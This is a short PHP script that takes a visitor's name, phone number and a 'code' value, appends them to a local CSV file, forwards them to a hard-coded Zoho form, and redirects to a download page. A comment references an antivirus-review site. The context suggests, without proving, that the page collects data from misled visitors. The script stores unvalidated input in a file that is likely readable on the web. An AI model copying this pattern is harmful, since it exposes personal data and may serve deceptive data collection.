<?php
// Retrieve form data
$name = $_POST['SingleLine'];
$phone = $_POST['SingleLine1'];
$code = $_POST['SingleLine2'];

// Save form data to output.csv
$data = array($name, $phone, $code);
$file = fopen('output.csv', 'a');
fputcsv($file, $data);
fclose($file);

// Post data to Zoho form
$zohoURL = 'https://forms.zohopublic.in/icaretech3/form/AmazingSet/formperma/TnXUIChtsyU1cVkiUi1Sj87Lece55mOLmypDth_oVeM/htmlRecords/submit';
$fields = array(
    'SingleLine' => $name,
    'SingleLine1' => $phone,
    'SingleLine2' => $code
);

$options = array(
    'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($fields),
    ),
);
$context  = stream_context_create($options);
$result = file_get_contents($zohoURL, false, $context);

// Redirect to bestantivirusreview.online
header('Location:/downloading.html');
exit;
?>
